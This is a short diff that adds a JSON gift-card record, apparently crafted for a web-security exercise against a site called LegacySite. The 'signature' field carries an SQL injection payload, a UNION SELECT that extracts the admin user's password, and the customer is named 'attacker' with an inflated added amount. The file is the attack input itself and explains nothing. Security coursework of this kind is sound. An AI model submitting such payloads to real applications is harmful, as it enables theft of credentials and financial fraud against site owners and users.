@@ -1,0 +1,3 @@
+{"merchant_id": "Amazon Gift Card", "customer_id": "attacker", "total_value": "1000", "records": [{"record_type":
+"amount_change", "amount_added": 2000, "signature": "[ ''' UNION select password FROM LegacySite_user WHERE
+username='admin']"}]}
